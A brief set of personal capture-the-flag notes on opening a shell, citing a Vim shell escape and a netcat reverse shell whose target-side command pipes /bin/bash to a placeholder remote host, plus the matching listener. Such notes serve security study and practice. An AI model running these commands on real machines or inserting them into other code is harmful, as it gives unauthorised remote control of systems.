// These are actual notes, and not relevant to the notes app.

# CTF Notes

## Opening a shell
1. Vim : !/bin/bash
2. netcat reverse shell _(see below)_

#### Netcat reverse shell
On the target machine shell : `nc <host> <any port> -e /bin/bash`

On your machine: `nc -lvp <port no>`
